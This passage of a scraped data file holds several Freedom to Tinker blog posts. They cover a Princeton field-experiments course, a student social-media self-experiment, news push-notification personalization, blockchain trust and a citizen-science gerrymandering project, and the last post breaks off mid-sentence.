"143","2018-07-03","2023-03-24","https://freedom-to-tinker.com/2018/07/03/teaching-the-craft-ethics-and-politics-of-field-experiments/","How can we manage the politics and ethics of large-scale online behavioral research? When this question came up in April during a forum on Defending Democracy at Princeton, Ed Felten mentioned on stage that I was teaching a Princeton undergrad class on this very topic. No pressure! Ed was right about the need: people with undergrad computer science degrees routinely conduct large-scale behavioral experiments affecting millions or billions of people. Since large-scale human subjects research is now common, universities need to equip students to make sense of and think critically about that kind of power. This semester, with the support and encouragement of colleagues in Sociology, Psychology, and the Center for IT Policy, I taught a sociology class on the craft, ethics, and politics of field experiments, SOC 412: Designing Field Experiments at Scale (open access resources). Building on lessons from this pilot seminar, we plan to assess the possibility of a much larger lecture class. In this post, I review how the class was structured and what we achieved. In a second post, I’ll share what I learned by teaching it, and offer suggestions for future classes at seminar or lecture sizes. I am profoundly grateful to the dedicated, hard-working students who took this class: 3 juniors, 5 seniors, and 2 first-year PhD students. Six were from computer science, electrical engineering, or Econ/CS. Two students were from political science. The class also included a philosophy student and one student from operations research. This diversity enriched our conversations and strengthened student teams. I’m also grateful to Matt Salganik for suggesting that I create this class and to Betsy Paluck, who also offered substantial support, advice, and feedback. I wove three parallel threads into SOC412: research methods, discussions of ethical/political issues, and participatory research with communities. The syllabus prioritized methods in the early parts of the class, focused on research projects toward the end, and maintained a steady tempo of ethical/political discussions throughout. I developed a series of slide decks to help students grow intuitions about experiments. Slides are at github.com/natematias/SOC412 Participatory Field Experiments in the Classroom Classes on social experiments don’t typically include field experiments, and for good reason. Based on a review of syllabi collected by Martin Saveski, I found that most classes on experiments and causal inference, even at the graduate level, focus on research design and analysis, inviting students to read, recalculate, and comment on published research. Brendan Nyhan’s lab-style seminar on Experiments in Politics is an exception: by the end of the semester, the whole class designs and conducts a single publishable experiment. Brendan keeps his class manageable by focusing on Mechanical Turk and survey experiments. In these studies, the design is determined entirely by the researchers, and experiments don’t involve observations over periods of time. In my class, neither of those things were true. I wanted students to talk to their research participants and co-design research with them. This would expose students to a greater range of ethical questions. It also made the class more challenging to organize. Field Experiments: By doing research in a naturalistic setting, students had to think about the tensions between experiments with practical value and scientific questions. Students also were confronted with the ethics of experiments that shape people’s daily lives, in context. Our aim of completing field experiments by the end of the semester also had some risks: (a) Until the study design was finalized, we couldn’t know if experiments would not be complete by the end of the semester, (b) unreliability in any behavioral/administrative measures could lead to surprises part-way through the semester. In the first month of SOC 412, students conducted a field experiment in their own social media feeds, randomly assigning posts to have colored and plain backgrounds and counting how their friends engaged. Read the results here. Participatory research: by supporting students to design research with community partners, I was able to ensure that the voices and interests of research participants would be a very real, present part of students’ projects and learning. Students had to negotiate with communities to develop their studies. As I witnessed with Sasha Costanza Chock’s Co-design studio class at MIT, participatory research classes have many risks, and educators can expect that some percentage of class projects achieve something smaller than originally intended. Delivering meaningful learning experiences with participatory field experiments: To help students learn while also supporting communities in a single semester, I included a lot of up-front scaffolding for student experiments: I notified Princeton’s ethics board (IRB) about the class in advance and filed a rough draft of anticipated experiment plans for IRB approval, with the expectation of amending the ethics protocol partway through the semester. Princeton’s IRB was amazing and reliably met our needs. Before the class, I organized a community research summit at MIT, whose goal was partly to select potential research partners for the class. Out of 25 study ideas, I narrowed the list of class-appropriate studies to 5 (I’m exploring those other ideas independently) In the main, class experiments were conducted using the CivilServant infrastructure with communities on reddit, constraints that narrowed the possible experiments to something achievable in a semester. I planned to hire a research manager at CivilServant or work with a TA to support our relationships with partner communities (participatory design classes typically include this role). CivilServant’s research manager, didn’t start until April, too late to support the class, so I did this work in addition to teaching. I definitely plan to include this role next year! A software engineer from CivilServant to support student research projects anywhere new software development was necessary. What Students Learned and Achieved I had two overarching goals for students of SOC412:that they would (a) develop experimentation skills and (b) learn to think/write critically about large-scale behavioral research. The two-part final assignment included (1) a team project to develop an experiment, accompanied by (2) an individual essay on one ethical or political issue from the class, connected to their team’s specific experiment. Over twelve weeks, five student teams developed the following studies, all of which are currently underway or about to launch: Improving people’s resilience against organized attempts to demoralize people and push them away from an online community. Preventing unruly behavior in online communities through automated nudges that monitor the algorithms behind large-scale unruly behavior on reddit. Helping people ask better questions in large online discussions Testing commonly held theories about phone addiction. Auditing tech platforms for [redacted] Reviewing final student papers, I was encouraged by the depth of students’ connections between experimentation and political/ethical issues. Just to mention a few of the final essays, students wrote on the epistemology and policy of replications, the role of measurement in generalizable knowledge, the ethics of risky experiments involving trauma, methods for crowdsourcing experiment ideas from a wider public, difficulties of estimating risk/benefits in conflict situations, and the legal risks of auditing social platforms. I also learned a lot from this class. Teaching field experiments gave me ongoing opportunities to revisit my assumptions, articulate ideas clearly in code, and think more about the kind of statistical and ethical learning necessary for public involvement in citizen behavioral science. I’m proud of what the students achieved. At the same time, teaching and coordinating the class was also overwhelming. In a follow-up post, I say more about what I learned and how I’m thinking about teaching the class next year."
"144","2018-07-16","2023-03-24","https://freedom-to-tinker.com/2018/07/16/can-classes-on-field-experiments-scale-lessons-from-soc412/","Last semester, I taught a Princeton undergrad/grad seminar on the craft, politics, and ethics of behavioral experimentation. The idea was simple: since large-scale human subjects research is now common outside universities, we need to equip students to make sense of that kind of power and think critically about it. In this post, I share lessons for teaching a class like this and how I’m thinking about next year. Path diagram from SOC412 lecture on the Social Media Color Experiment Most behavioral experiments out in the world are conducted by people with no university training. In 2016, bloggers at NerdyData estimated that A/B test company Optimizely’s software was deployed on over half a million websites. In 2017, the company announced that it had passed its one millionth experiment. Companies trying to support millions of behavioral studies aren’t waiting for universities to train socially conscious experimenters. Instead, training happens in hotel ballrooms at events like Opticon, which draws in over a thousand people every year, SearchEngineLand’s similarly sized SMX marketing conference series, and O’Reilly’s Strata conferences. And while scientists might consider experiments to be innocuous on their own, many have begun to wonder if the drive to optimize profits through mass behavioral experimentation may have damaging side effects. Traditionally, training on field experiments has primarily been offered to gradstudents, mostly through mentorship with an advisor, in small graduate seminars, or in classes like ICPSR’s field experiments summer course. Master’s programs in education, economics, and policy also have a history of classes on evaluation. These classes tend to focus on the statistics of experimentation or on the politics of government-directed research. So far, I’ve only found two other undergraduate field experiments classes: one by Esther Duflo in economics and Carolina Castilla’s class at Colgate. My class, SOC412, set out to introduce students to the actual work of doing experiments and also to give them opportunity to reflect, discuss, and write about the wider societal issues surrounding behavioral research at scale in today’s society. This 10-student seminar class was a prototype for a much larger lecture class I’m considering. The class also gave me an opportunity grow at teaching hybrid classes that combine statistics with critical reflection. In this post, I describe the class, imagine how it could be improved as a seminar, outline what might need to change for a larger lecture class, and what I learned. I will also include notes for anyone thinking about teaching a class like this. Goals of the Class My goal for students was to introduce them to the process of conducting experiments in context of wider debates about the role of experiments in society. By the end of the class, students would have designed and conducted more than one field experiment and have a chance to write about how that experiment connects to these wider social issues. The class alternated between lecture/discussion sessions and lab-like sessions focused on methods. Assignments in the first part of the semester focused on the basics of experimentation, and a second part of the class focused more on developing a final project. You can see the syllabus here. Scaffolding Student Work on Field Experiments Designing and completing a field experiment in a single semester isn’t just a lot of work- it requires multiple external factors to converge: Collaborations with external partners need to go smoothly The delivery of the intervention and any measurement need to be simple Experiments need to be doable in the available time The university’s ethics board needs to work on the timeline of an undergrad class In the first post about SOC412, I give more detail on the work I did to scaffold external factors. SOC412 also gave me a chance to test the idea that the software I’m developing with the team at CivilServant could reduce the overhead of planning and conducting meaningful experiments with communities. By dedicating some of CivilServant’s resources to the class and inviting our community partners to work with students after our research summit in January, I hoped that students would be able to complete a full research cycle in the course of the class. How the CivilServant software supports community experiments online We almost did it <grin>. Students were able to fully develop experiment plans by the end of the semester, and we are conducting all of the studies they designed. Here are some of the great outcomes I got to see from students and that I want to remember for my own future teaching: Asking students to do a first experiment in their own lives is a powerful way to prompt student reflection on the ethics of experimentation Conversations with affected communities do help students think more critically about the contributions and limitations of experimentation in pragmatic settings The statistics parts of the class went smoothest when I anticipated student needs and wrote well documented code for students to work from It worked well to review basic statistical concepts through prepared datasets and transition students to data from their own experiments partway through the course Lectures that illustrated central concepts in multiple ways worked well Simulations were powerful ways to illustrate p-hacking, false positives, false negatives, and decision criteria for statistical results, since we could adjust the parameters and see the results to grow student intuitions Short student presentations prompted close reading by students of specific field experiment designs and gave them a chance to explore personal interests more deeply I think I did the right thing to offer students a chance to develop their own own unique research ideas beyond CivilServant. This added substantial time to my workload, but it allowed students to explore their own interests. I don’t think it will scale well. Areas for Improving the Class Here are some of the things that prevented us from meeting the full goals of the class, and how I would teach a seminar class differently in the future: Online discussion: Never use Piazza again. The system steers conversations toward question-answer with the instructor rather than discussion, and the company data-mines student behavior and sells it to job recruiters (they make a big show about opt-in, but it’s an dark pattern default checkbox). I’m thinking about shifting to the open source tools Discourse and NB. Statistics: Introduce students directly to a specific person who can provide extra statistics support as needed, rather than just point them to institutional resources (Brendan Nyhan does this in his politics experiments syllabus) Pre-register every anticipated hypothesis test before the class, unless you want students to legitimately question your own work after you teach them about p-hacking <grin> When teaching meta-analysis and p-hacking, give students a pre-baked set of experiment results (I’m working on getting several large corpora of A/B tests for this, please get in touch if you know where I can find one) Designing experiments: Students conducted power analyses based on historical data, and difficulties with power analysis caused substantial delays on student projects. Develop standard software code for conducting power analyses for experiments with count variable outcomes, which can be reasonably run on student laptops before the heat death of the universe. Experiments are a multi-stage process where early planning errors can compound. The class needs a good way to handle ongoing documents that will be graded over time, and which may need to be directly adjusted by the instructor or TA for the project to continue. When using software to carry out experiment interventions, don’t expect that students will read the technical description of the system. Walk students through a worked example of an experiment carried out using that software. Create a streamlined process for piloting surveys quickly Create a standard experiment plan template in Word, Google Docs, and LaTeX. Offering an outline and example still yields considerable variation between student work Consider picking a theme for the semester, which will focus students’ theory reading and their experiment ideas Since classes have hard deadlines that cannot easily be altered, do not support student research ideas that involve any new software development. Participatory research process: Schedule meetings with research partners before the class starts and include a regular meeting time in the syllabus (Nyhan does something similar with an “X period”). If you want to offer students input, choose the meeting time at the beginning of the semester and stick to it. Otherwise, you will lose time to scheduling and projects will slip. Write a guide for students on the process of co-designing a research study, one that you run by research partners, that gives students a way to know where they are in the process, check off their progress, and communicate to the instructor where they are in the process. Team and group selection: While it would be nice to allow students to form project teams based on the studies they are interested in, teams likely need to be formed and settled before students are in a position to imagine and develop final project ideas. Writing: Even students with statistics training will have limited experience writing about statistics for a general audience. Here are two things I would do differently: Create a short guide, partly based on the Chicago Guide to Writing about Numbers, that shows a single finding well reported, poorly/accurately reported, and poorly/inaccurately reported. Talk through this example in class/lab. In the early part of the class, while waiting for results from their own first set of experiments, assign students to write results paragraphs from a series of example studies, referring to the guide. Supporting a Class With a Startup Nonprofit This class would not have been possible without the CivilServant nonprofit or Eric Pennington, CivilServant’s data architect. CivilServant provides software infrastructure for collecting data, conducting surveys, and carrying out randomized trials with online communities. The CivilServant nonprofit (which gained a legal status independent of MIT on April 1st, halfway through the semester) also provided research relationships for students. While gradstudents developed their own studies, undergraduate students used CivilServant software and depended on the nonprofit’s partner relationships. After the class, some students expressed regret that they didn’t end up doing research outside of the opportunities provided through CivilServant. During the semester, I developed several opportunities to conduct field experiments on the Princeton campus, and I explored further ideas with university administrators. Unfortunately, none of the fascinating student ideas or university leads were achievable within a semester (negotiating with university administrators takes time). Between the cost of the summit and staff time, CivilServant put substantial resources into the class. Was it worth the time and expense? When working with learners, our research couldn’t happen as quickly or efficiently as it might have otherwise. Yet student research also helped CivilServant better focus our software engineering priorities. Supporting the class also gave us a first taste at what it might be like to combine a faculty position with my public interest research. Next spring, we will need to plan well to ensure that CivilServant’s wider work isn’t put on hold to support the class. Should SOC 412 Be a Lecture or Seminar? Do I think this class can scale to be a lecture course? I think a larger lecture course may be possible with some modifications under specific conditions: Either (a) drop the participatory component of the course or (b) organize each precept (section) to carry out a single field experiment, coordinated by the preceptor (TA) If needed, relax the goal of completing studies by the end of the semester and find other ways for students to develop their experience communicating results The technical processes for student experiments should not require any custom software, or it will be impossible to support a large number of student projects. This would constrain the scope of possible experiments but increase the chance of students completing their experiments If I’m to teach this as a lecture course next year, I should apply for a teaching grant from Princeton, since scaling the class will take substantial work on software, assignments, and class materials to formalize Notes on Preceptors (TAs) Careful preceptor recruitment, training, and coordination would be essential to scale this class If each precept (section) does a single experiment, the work of developing studies will need to be distributed and managed differently than with the teams of 2-3 that I led The class needs clear grading systems and rubrics for student writing assignments Preceptors in the course could receive a privileged authorship position on any peer reviewed studies from their section, in acknowledgment of the substantial work of supporting this course Should You Teach a Class Like This? I had an amazing time teaching SOC412, the students learned well, and we completed and are launching a series of field experiments, all of which are publishable. Teaching this class with ten students was a lot of work, much more than a typical discussion seminar. If you’re thinking about teaching a class like this, here are some questions to ask yourself: do you have the means to deploy multiple field experiments? do you have staff who can support community partnerships? do you have enough partners lined up? is your IRB responsive enough to make quick emendations during a semester? does your department already teach students the needed statistics prerequisites? do you have streamlined ways to conduct experiments that will work for learners? do you have Standard Operating Procedures for common study types, along with full code for the statistical methods? do you have the resources to continuously update any incomplete parts of student projects throughout the course to ensure the quality of projects?"
"145","2022-06-01","2023-03-24","https://freedom-to-tinker.com/2022/06/01/improving-your-relationship-with-social-media-may-call-for-a-targeted-approach/","By Max Fineman and Matthew Salganik Chances are, you’re on social media every day. If you have teens, they are too. And everyone seems worried about just how much social media they’re consuming; even many teens. Beyond these individual worries, some researchers have linked social media use to increases in political tribalism, mental health problems, and suicide. Yet at the same time, many people seem to really love using social media. This combination was puzzling to us, as social scientists. So, as part of our recent undergraduate course in social networks at Princeton University, we decided to explore it further. In particular, we decided to ask: How can people use scientific ideas to create a healthier relationship with social media? You might think the best approach is to change your behavior based on previous research, but that runs into two problems. First, prior research doesn’t necessarily shed light on how individual users are affected by social media, and second, as best as researchers can tell, different social media platforms seem to impact people differently. Therefore, if you want to understand and improve your own relationship with social media, a promising approach is self-experimentation, where you basically run experiments on yourself. The students in our social networks class did just that – designing, conducting, and reflecting on a self-experiment involving social media. For example, one student who was interested in improving their sleep decided to stop using TikTok after 10 p.m. Another student interested in being less lonely posted more Instagram Stories. About 60 students did the activity, and there were some interesting patterns in what they found. We expected that students who limited their use—as opposed to increasing it—would benefit more in terms of personal well-being, loneliness, productivity, and sleep quality. But it turns out that the students who saw the most positive outcomes were those who designed their social media intervention in a targeted way – like avoiding Instagram while in the library. These students benefited more than students that tried something blunt, like quitting TikTok altogether. In other words, changes that should be the easiest to try — small interventions students could stick to long-term — had the most positive effects. Below we describe what our students did and learned. We’ve also included all of our materials so that you can try it yourself. What students did: Our class had about 60 students, from a variety of years and majors, and like most Princeton students, many of them were heavy users of several social media platforms. Each of them designed their own treatment and selected an outcome of interest. For example, some students were interested in improving their sleep and others were interested in wasting less time. In addition to these student-specific outcomes, we also had all students track two common outcomes that have been studied by other researchers: subjective well-being and time use changes. This process of self-experimentation is a bit different from what social scientists normally do. Typically, researchers standardize the treatment, randomly assign treatments to participants, and collect data so that we can compare across participants and treatment groups. In our class, however, each participant was a researcher and designed a unique treatment for themself. Even though this is not standard for research, self-experimentation can be a good way to learn. The treatments students developed fell into three main groups: Targeted limitation (about 45%). Students in this group restricted – but did not eliminate – their social media use. For example, students in this group did things like stopping TikTok use after 8pm and avoiding the Instagram feed (but still using Instagram for messaging). Targeted increase (about 15%). In class, we learned about some research that suggests people who use social media actively—rather than passively scrolling—see an improvement in their well-being. So some students committed to increasing their active engagement with social media. For example, students in this group did things like posting 3 times per day on Instagram or direct-messaging at least 3 friends. Elimination (about 40%). Students in this group eliminated their social media use altogether on one or more apps. Students who designed these treatments did things like delete Instagram or TikTok from their phone, and some actively replaced their social media use with another activity they valued such as reading the news or spending time with friends. What students found: Students who designed a targeted intervention—either a decrease or an increase in use—experienced the greatest benefits to their overall well-being. Students that made untargeted changes, such as deleting apps, tended not to experience as much benefit. This difference is probably because many students already had strong intuitions about which parts of their social media use were harming them. In the following sections, we provide a bit more detail on the effects of the different types of treatments. Targeted limitation The most popular type of treatment was to restrict just a part of their social media use. These treatments fell into roughly 3 groups: limiting time (e.g., only using social media 30 minutes a day, no using Instagram after 8pm); adding friction (e.g., moving the social media apps from their phone’s home screen); and, avoiding specific features (e.g., not using the NewsFeed but continuing to use other parts of Facebook). Here’s what happened to students who restricted – but did not eliminate – their social media use: Well-being improved: About half reported increased daily happiness and more positive emotions throughout the day. Loneliness decreased: More than a third reported feeling less lonely, while fewer than 15% experienced an increase in loneliness. Productivity increased: Almost every student told us they were more productive. Sleep quality improved: Half slept better, and the majority of the rest experienced no change. The effect on sleep quality was especially strong for students who added friction or avoided specific features. More in-person social interaction: Most reported engaging in more social interaction during the treatment period, usually hanging out with friends in person. Overall phone usage decreased: A majority spent less overall time on their phones during the experiment. For the most part, these were students that added friction or limited time. On the other hand, students who avoided specific features were more likely to spend the same amount of time on their phones as they did before their experiment. Many students adopted their limitation after the treatment period ended: About half stuck to their intervention, even after the class activity was over. Targeted increase In contrast to students that limited use, about 15% of students in the class increased their usage for the experiment. Students might have designed these kinds of treatments because in class we discussed a few studies suggesting that some kinds of social media usage can have a positive effect on well-being. Overall, students that increased their usage in a targeted way saw some positive effects, but they weren’t as strong as the students who did targeted limitations. Well-being improved. More than 60% said they experienced an increase in their well-being, happiness, and other positive emotions. Less stressed, anxious, and lonely. About a third reported feeling less stressed, anxious, and lonely. Changes in phone usage were mixed. A third said they used their phones less, a third said they used their phones more, and the rest said they used their phones the same amount as before the treatment period. Many students adopted their intervention after the treatment period ended. Interestingly, more than 40% also continued their increased use long-term. Most of these students had increased some type of active engagement, such as direct messaging with friends or regularly posting photos and videos on Instagram or TikTok. Elimination Among students who completely eliminated usage of at least one social media app, we didn’t see as much of an overall pattern: Well-being was mixed: Half said their well-being didn’t change, and the other half was split between students who reported their well-being getting better and worse. Stress and anxiety decreased for some, worsened for others: Around 70% said they experienced less stress and anxiety, but the other 30% actually felt more stress and anxiety during the treatment period than before. Loneliness worsened or did not change: More than half did not report a change in how lonely they felt, and almost a third felt more lonely during the treatment period. Productivity changes were mixed: These students were roughly equally split between those who said they were more productive and those who said their productivity didn’t really change. Sleep quality improved for some: Half said they slept better but about a third said they got less sleep when they eliminated their social media use. In-person social interaction increased: The vast majority spent more time with their friends in-person than before. Overall phone use decreased: Most said their overall phone screen time went down during the treatment period. Most returned to their old behavior: Most returned to their pretreatment use patterns after the experiment ended, but about 40% reduced or eliminated after the activity ended. Some said that during the activity they discovered benefits of reducing their usage and introduced limitations in their usage after the treatment period was over. Why did targeted interventions show more positive effects than elimination interventions? When we compared the three groups, we saw a general pattern indicating that targeted interventions—either limitations or increases in social media use—worked better than elimination. This pattern surprised some of us who thought that the most important difference would be between increases and decreases in usage. The students’ self-reflections after the experiment offer some clues about the pattern. Students using targeted interventions frequently wrote that they targeted only the parts of social media that their past experiences suggested were especially influential for them, whether positive or negative. By designing a strategic, specific intervention, they still maintained their use of other parts of social media that they liked and believed were beneficial to them. For example, many students already suspected that social media was distracting them from their coursework. They limited the time they spent on social media during the hours of the day when they did their coursework and saw an improvement in their productivity. But by focusing their treatment only on their coursework hours, they were able to keep using social media in other ways that benefited them. By contrast, students who eliminated every part of their usage were more likely to tell us that they missed certain aspects of social media during their intervention. For example, many students who deleted their apps altogether expressed frustration at not being able to do something they liked to do. Many also reported that they worried they were missing out on online social interactions and opportunities. They may have thrown out the good with the bad, leading to less overall improvement in well-being. Our main takeaway is that, if you want to reduce social media’s harmful effects on you and increase its benefits, the most effective approach may be to try a targeted intervention. We want to point out several caveats. First, this targeted invention will vary from person to person. All our students were doing this as part of a class activity, and the treatment period was only a few days. Also, because students designed their own treatment—rather than having it assigned to them—it is hard to rule out the possibility that certain kinds of students might have self-selected into targeted interventions. Further, many of the measurements were not as precise and our analysis was more informal than we would use in other settings. Finally, not that many students did a targeted increase so it is hard to say very much about this group. Try it yourself. Although our findings are limited in important ways, one of the great things about this activity is that anyone can do it, even outside of a classroom setting. If you want to try it yourself, we’ve included a slightly modified version of the materials that we used in our class at Princeton. In just three weeks, you can potentially improve your relationship with social media and learn about the joys and struggles of doing real social science research. If you are interested in trying this out, here are the materials we used for this activity and the class more generally. Links to Assignment 7 Assignment 8 Assignment 9 Syllabus Slides Please note that for some people, social media has very significant impacts on their mental health, both positive and negative. We urge you to exercise caution when experimenting with something that affects your mental health, and you may want to consult a mental health professional before trying any experimentation. If you are struggling with your mental health and need help, the National Alliance on Mental Illness provides numerous resources. Also, if you are considering using this activity in a class that you teach, here are three things to consider: The activity tries to provide a mix of structure and flexibility. Based on our conversations with students, we think that the freedom to choose their own treatment, outcomes, and hypothesis is key to making this successful. We also think the chance to discuss the activity with peers was valuable. It helped the students see themselves differently and learn more about the variety of ways that people interact with social media. That said, this flexibility often makes the results less scientifically rigorous. Whenever there was a tension between making this a good learning activity and a good research project, we tried to lean into that tension and remind students that all research designs involve trade-offs. A major design decision you’ll need to make is the length of the treatment period. For our class, the treatment periods typically lasted between 3 days and a week. After the experiment many students reported wishing that the treatment period was longer. However, if your treatment period is longer, it may be harder to sustain. In our evaluation, the students reported finding the activity valuable, interesting, and not too time consuming. Although we didn’t assess it formally, we think that many students would also say that this activity helped improve their well-being and relationship with social media. Thanks to the teaching staff from this year and last year for helping us shape this activity: Emily Cantrell, Kyle Chen, and Katie Donnelly-Moran. We also want to thank Janet Vertesi who has used a related activity in some of her classes."
"146","2019-02-12","2023-03-24","https://freedom-to-tinker.com/2019/02/12/do-mobile-news-alerts-undermine-medias-role-in-democracy-madelyn-sanfilippo-at-citp/","Why do different people sometimes get different articles about the same event, sometimes from the same news provider? What might that mean for democracy? Speaking at CITP today is Dr. Madelyn Rose Sanfilippo, a postdoctoral research associate here at CITP. Madelyn empirically studies the governance of sociotechnical systems, as well as outcomes, inequality, and consequences within these systems–through mixed method research design. Today, Madelyn tells us about a large scale project with Yafit Lev-Aretz to examine how push notifications and personalized distribution and consumption of news might influence readers and democracy. The project is funded by the Tow Center for Digital Journalism at Columbia University and the Knight Foundation. Why Do Push Notification Matters for Democracy? Americans’ trust in media have been diverging in recent years, even as society worries about the risks to democracy from echo chambers. Madelyn also tells us about changes in how Americans get their news. Push notifications are one of those changes– news organizations that send alerts to people’s computers and to our mobile phones about news they think are important. And we get a lot of them. In 2017, Tow Center researcher Pete Brown found that people get almost one push notification per minute on their phones– interrupting us with news. In 2017, 85% of Americans were getting news via their mobile devices, and while it’s not clear how many of that came from push notifications, mobile phones tend to come with news apps that have push notifications enabled by default. When Madelyn and Yafit started to analyze push notifications, they noticed something fascinating: the same publisher often pushes different headlines to different platforms. They also found that news publishers use language with less objectivity and more subjective, emotional content in those notifications. Madelyn and Yafit especially wanted to know if media outlets covered breaking news differently based on political affiliation of their readers. Comparing notifications of disasters, gun violence, and terrorism, they found differences in the number of push notifications published by publishers with higher and lower affiliation. They also found differences in the machine-coded subjectivity and objectivity of how these publishers covered those stories. Composite subjectivity of different sources (higher is more subjective) Do Push Notifications Create Political Filter Bubbles? Finally, Madelyn and Yafit wanted to know if the personalization of push notifications shaped what people might be aware of. First, Madelyn explains to us that personalization takes multiple forms: Curation: sometimes which articles we see is curated by personalized algorithms (like Google News) Sometimes the content itself is personalized, where two people see very different text even though they’re reading the same article Together, they found that location based personalization is common. Madelyn tells us about three different notifications that NBC news sent to people the morning after the Democratic primary. Not only did national audiences get different notifications, but different cities received notes that mentioned Democrat and Republican candidates differently. Aside from midterms, Madelyn and her colleagues found out that sports news is often location-personalized. Behavioral Personalization Madelyn tells us that many news publishers also personalize news articles based on information about their readers, including their reading behavior and surveys. They found that some news publishers personalize messages based on what they consider to be a person’s reading level. They also found evidence that publishers tailor news based on personal information that they never provided to the publisher. Governing News Personalization How can we ensure that news publishers are serving democracy in the decisions that they make and the knowledge they contribute to society? In many publishers, decisions about the structure of news personalization are made by the business side of the organization. Madelyn tells us about future research she hopes to do. She’s looking at the means available to news readers to manage these notifications as well as policy avenues for governing news personalization. Madelyn also thanks her funders for supporting this collaboration with Yafit Lev-Aretz: the Knight Foundation and the Tow Center for Digital Journalism."
"147","2019-03-26","2023-03-24","https://freedom-to-tinker.com/2019/03/26/the-trust-architecture-of-blockchain-kevin-werbach-at-citp/","In 2009, bitcoin inventor Satoshi Nakomoto argued that it was “a system for electronic transactions without relying on trust.” That’s not true, according to today’s CITP’s speaker Kevin Werbach (@kwerb), a professor of Legal Studies and Business Ethics at the Wharton School at UPenn. Kevin is author of a new book with MIT Press, The Blockchain and the New Architecture of Trust. A world-renowned expert on emerging technology, Kevin examines business and policy implications of developments such as broadband, big data, gamification, and blockchain. Kevin served on the Obama Administration’s Presidential Transition Team, founded the Supernova Group (a technology conference and consulting firm) and helped develop the U.S. approach to internet policy during the Clinton Administration. Blockchain does actually rely on trust, says Kevin. He tells us the story of the cryptocurrency exchange QuadrigaCX, who claimed that millions of dollars in cryptocurrency were lost when their CEO passed away. While whole story was more complex, Kevin says, it reveals how much bitcoin transactions rely on many kinds of trust. Rather than removing the need for trust, blockchain offers a new architecture of trust compared to previous models. Peer to peer trust is based on personal relationships. Leviathan trust, described by Hobbes, is a social contract with the state, which then has the power to enforce private agreements between people. The power of the state makes us more trusting in the private relationships– if you trust the state and if the legal system works. Intermediary trust involves a central entity that manages transactions between people Blockchain is a new kind of trust, says Kevin. With blockchain trust, you can trust the ledger without (so it seems) trusting any actor to validate it. For this to work, transactions need to be very hard to change without central control – if anyone had the power to make changes, you would have to trust them. Why would anyone value the blockchain? Blockchain minimizes the need for certain kinds of trust: removing single points of failure, reducing risks of monopoly, and reduces friction from the intermediation. Blockchain also expands trust by minimizing reconciliation, carries out automated execution, and increases the auditability of records. What could possibly go wrong? Even if the blockchain ledger is auditable and trustworthy, the transaction record isn’t the whole system. Kevin points out that 80% of all bitcoin users rely on centralized key storage. He also reported figures that 20-80% of all Initial Coin Offerings were fraudulent. Kevin tells us about “Vlad’s conundrum”- there’s a direct conflict between the design of the blockchain system and any regulatory model. The blockchain doesn’t know the difference between transactions, and there’s no entity that can say “no, that’s not okay.” Kevin tells us about the use of the blockchain for money laundering and financing terrorism. He also tells us about the challenge of moderating child pornography data that has been distributed across the blockchain- exposing every bitcoin node to legal risks. None of these risks are as simple as they seem. Legal enforcement is carried out by humans who often consider intent. Simply possessing digital bits that represent child pornography data will not doom bitcoin. Furthermore, systems are less decentralized or anonymous than they appear. Regulations about parts of the system at the edges and endpoints of the blockchain can promote trust and innovation. Regulators have often been able to pull systems apart, find the involved parties, and hold actors accountable. Kevin argues that designers of blockchain systems have to manage three trade-offs. Trust, freedom of action, and convenience. Any designer of a system will have to make hard choices about the tradeoffs among each of these factors. aCiting Vili Lehdonvirta’s blockchain paradox, Kevin tells us several stories about ways that centralized governance processes managed serious problems and fraud in blockchain systems that would have been problems if governance had purely been decentralized. Kevin also describes technical mechanisms for governance: voting systems, special kinds of contracts, arbitration schemes, and dispute resolution processes Overall, Kevin tells us that blockchain governance comes back to trust– which shapes how we act with confidence in circumstances of uncertainty and vulnerability."
"148","2019-04-24","2023-03-24","https://freedom-to-tinker.com/2019/04/24/openprecincts-can-citizen-science-improve-gerrymandering-reform/","How the American public understand gerrymandering and collect data that could lead to fairer, more representative voting districts across the US? Speaking today at CITP are Ben Williams and Hannah Wheelen of the Princeton Gerrymandering Project, part of a team with Sam Wang, William Adler, Steve Birnbaum, Rick Ober, and James Turk. Ben is the lead coordinator for the Princeton Gerrymandering Project’s research and organizational partnerships. Hannah, who is also speaking, coordinates the collection of voting precinct boundary information. What’s Gerrymandering and Why Does it Matter? Ben opens by explaining what gerrymandering is and why it matters. Reapportionment is a process by which congressional districts are allocated to the states after each decennial census. The process of redrawing those lines is called redistricting. When redistricting happens, politicians sometimes engage in gerrymandering, the practice of redrawing the lines to benefit a particular party– something that is common behavior by all parties. Who has the power to redistrict federal lines? Depending on state law, redistricting is done by by different parties, who have different kinds of independent commissions who make the decisions, independently from the politicians affected by it advisory commissions who advise a legislature but have no decision-making power politician or political appointees state legislatures Ben tells us that gerrymandering has been part of US democracy ever since the first congress. He tells us about Patrick Henry, governor of Virginia, who redrew the lines to try to favor James Monroe over James Madison. The term came into use in the 19th century, and it has remained common since then. Why Do People Care About Gerrymandering And What Can We Do About It? Ben tells us about the Tea Party Wave in 2010, when Republicans announced in the Wall Street Journal a systematic plan, called REDMAP, to redraw districts to establish a majority for republicans in the US for a decade. Democrats have also done similar things on a smaller scale. Since then, the designer of the REDMAP plan has become an advocate for reform, says Ben. How do we solve gerrymandering if the point is that politicians use it to establish their power and are unlikely to give it up? Ben describes three structures: Create independent commissions to draw the lines. Ballot initiatives in MI, CO, UT, and MO and state legislative action (VA) have put commissions in place. Require governors to approve the plan, and give the governor the capcity to refer district lines to courts (WI, MD) State supreme courts (PA, NC?) These structures have been achieved in some states, through a variety of means: litigation, and through political campaigns. Ben also hopes that if citizens can learn to recognize gerrymandering, they can spot it and organize to respond as needed. Decisions and controversies about gerrymandering need reliable evidence, especially at times when different sides bring their own experts to a conversation. Ben describes the projects that have been done so far, summarized the recent paper, “An Antidote for Gobbledygook: Organizing the Judge’s Partisan Gerrymandering Toolkit into a Two-Part Framework.” He also mentions the Metric Geometry and Gerrymandering Group at Tufts and MIT and work by Procaccia and Pegden at Carnegie Mellon. Citizen Science Solutions to the Bad Data Problem in Redistricting Accountability These many tools have opened new capacities for citizens to have an informed voice on redistricting conversations. Unfortunately, all of these projects rely on precinct level data on the geography of voting precincts and vote counts at a precinct level. Hannah talks to us about the challenge of contacting thousands of counties for precinct-level voting data. In many cases, national datasets of voter behavior are actually wrong– when you check the paper records held by local areas, you find that the boundaries are often wrong. Worse, errors are so common that gerrymandering datasets could easily produce mistaken outcomes. With too many errors for researchers to untangle, how can these data tools be useful? Might local citizens be able to contribute to a high quality national dataset about voting precincts, and then use that data to hold politicians accountable? Hannah tells us about OpenPrecincts, a citizen science project by the Princeton Gerrymandering Project to organize the public 